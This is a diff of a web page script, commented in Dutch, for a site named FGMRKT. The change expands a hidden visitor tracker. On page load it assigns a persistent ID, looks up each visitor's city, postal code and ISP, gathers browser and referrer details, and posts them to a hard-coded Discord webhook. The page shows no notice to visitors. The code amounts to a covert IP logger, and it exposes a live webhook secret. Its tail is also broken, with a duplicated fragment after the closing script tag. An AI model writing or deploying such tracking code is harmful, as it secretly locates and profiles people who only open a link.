@@ -128,14 +128,14 @@
   </div>
   
 <script>
-    // Discord Webhook URL - VERVANG DIT MET JE EIGEN WEBHOOK URL
+    // Discord Webhook URL
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1438795086937854014/s-BtKDQIXMlxJzElvEcNqjMbX4PP-U6WJeEmITflYFgamDFI0sFu9HzAMh-m5isTbiXR';
     
     // Debug logging
     function debugLog(message) {
         console.log('🔍 FGMRKT:', message);
     }
-    
+
     // Genereer een unieke gebruikers-ID
     function generateUserId() {
         let userId = localStorage.getItem('fgmrkt_user_id');
@@ -164,23 +164,64 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
         
-        // Probeer locatie te verkrijgen via IP
+        // Probeer locatie te verkrijgen via meerdere services voor betere nauwkeurigheid
         let location = 'Onbekend';
+        let locationService = 'Geen';
+        
         try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            location = `${data.city}, ${data.region}, ${data.country_name}`;
-            debugLog('Locatie: ' + location);
+            // Probeer eerst ipapi.co (meest betrouwbaar)
+            const response1 = await fetch('https://ipapi.co/json/');
+            const data1 = await response1.json();
+            location = `${data1.city}, ${data1.region}, ${data1.country_name} (${data1.postal})`;
+            locationService = 'ipapi.co';
+            debugLog('Locatie via ipapi.co: ' + location);
+            
+            // Voeg ISP/internet provider toe voor meer context
+            if (data1.org) {
+                location += ` | ${data1.org}`;
+            }
+            
         } catch (error) {
-            debugLog('Kon locatie niet ophalen: ' + error);
+            debugLog('ipapi.co faalde: ' + error);
+            
+            // Fallback 1: ipgeolocation.io
+            try {
+                const response2 = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=demo');
+                const data2 = await response2.json();
+                location = `${data2.city}, ${data2.state_prov}, ${data2.country_name} (${data2.zipcode})`;
+                locationService = 'ipgeolocation.io';
+                debugLog('Locatie via ipgeolocation: ' + location);
+            } catch (error2) {
+                debugLog('ipgeolocation faalde: ' + error2);
+                
+                // Fallback 2: ipify
+                try {
+                    const response3 = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await response3.json();
+                    location = `IP: ${ipData.ip} | Locatie onbekend`;
+                    locationService = 'ipify';
+                } catch (error3) {
+                    location = 'Locatie niet beschikbaar';
+                    locationService = 'geen';
+                }
+            }
         }
+        
+        // Verzamel extra netwerkinfo
+        const connectionInfo = {
+            effectiveType: navigator.connection ? navigator.connection.effectiveType : 'onbekend',
+            downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'onbekend'
+        };
         
         return {
             userId,
             browserInfo,
             location,
+            locationService,
+            connectionInfo,
             timestamp: new Date().toISOString(),
-            page: window.location.href
+            page: window.location.href,
+            referrer: document.referrer || 'Direct bezoek'
         };
     }
     
@@ -194,47 +235,108 @@
         debugLog('📤 Verzenden naar Discord...');
         
         const embed = {
-            title: 'Nieuwe bezoeker op FGMRKT',
+            title: '🚀 Nieuwe bezoeker op FGMRKT',
             color: 0x9932CC,
             fields: [
                 {
-                    name: 'Gebruikers-ID',
-                    value: userData.userId,
-                    inline: true
+                    name: '👤 Gebruikers-ID',
+                    value: '`' + userData.userId + '`',
+                    inline: false
                 },
                 {
-                    name: 'Locatie',
+                    name: '📍 Locatie',
                     value: userData.location,
                     inline: true
                 },
                 {
-                    name: 'Tijdstip',
+                    name: '🌐 Locatie Service',
+                    value: userData.locationService,
+                    inline: true
+                },
+                {
+                    name: '🕒 Tijdstip',
                     value: new Date(userData.timestamp).toLocaleString('nl-NL'),
                     inline: true
                 },
                 {
-                    name: 'Browser',
-                    value: userData.browserInfo.userAgent.substring(0, 100) + '...',
-                    inline: false
-                },
-                {
-                    name: 'Taal',
-                    value: userData.browserInfo.language,
+                    name: '🔗 Referrer',
+                    value: userData.referrer.substring(0, 50) + (userData.referrer.length > 50 ? '...' : ''),
                     inline: true
                 },
                 {
-                    name: 'Platform',
+                    name: '💻 Platform',
                     value: userData.browserInfo.platform,
                     inline: true
                 },
                 {
-                    name: 'Schermresolutie',
+                    name: '🗣️ Taal',
+                    value: userData.browserInfo.language,
+                    inline: true
+                },
+                {
+                    name: '📱 Scherm',
                     value: `${userData.browserInfo.screenWidth}x${userData.browserInfo.screenHeight}`,
+                    inline: true
+                },
+                {
+                    name: '⏱️ Timezone',
+                    value: userData.browserInfo.timezone,
                     inline: true
                 }
             ],
-            timestamp: userData.timestamp
+            timestamp: userData.timestamp,
+            footer: {
+                text: 'FGMRKT Tracker • ' + new Date().getFullYear()
+            }
         };
+        
+        try {
+            const response = await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    embeds: [embed],
+                    username: 'FGMRKT Tracker',
+                    avatar_url: 'https://img.icons8.com/color/48/000000/rocket.png'
+                })
+            });
+            
+            if (response.ok) {
+                debugLog('✅ Succesvol verzonden naar Discord!');
+            } else {
+                debugLog('❌ Fout bij verzenden: ' + response.status);
+                debugLog('Response: ' + await response.text());
+            }
+        } catch (error) {
+            debugLog('❌ Fetch error: ' + error);
+        }
+    }
+    
+    // Verzamel en stuur gegevens wanneer de pagina geladen is
+    document.addEventListener('DOMContentLoaded', async () => {
+        // Wacht even zodat de pagina volledig geladen is
+        setTimeout(async () => {
+            debugLog('🚀 Pagina geladen, verzamel data...');
+            const userData = await collectUserInfo();
+            await sendToDiscord(userData);
+        }, 1500);
+    });
+    
+    // viewport fix voor Instagram of mobiele browsers
+    function fixInstagramViewport() {
+        const container = document.querySelector('.container');
+        if (container) container.style.top = `${window.innerHeight / 2}px`;
+    }
+    
+    window.addEventListener('resize', fixInstagramViewport);
+    window.addEventListener('orientationchange', fixInstagramViewport);
+    window.addEventListener('load', fixInstagramViewport);
+    setTimeout(fixInstagramViewport, 250);
+    setTimeout(fixInstagramViewport, 800);
+    setTimeout(fixInstagramViewport, 1500);
+</script>
         
         try {
             const response = await fetch(DISCORD_WEBHOOK_URL, {
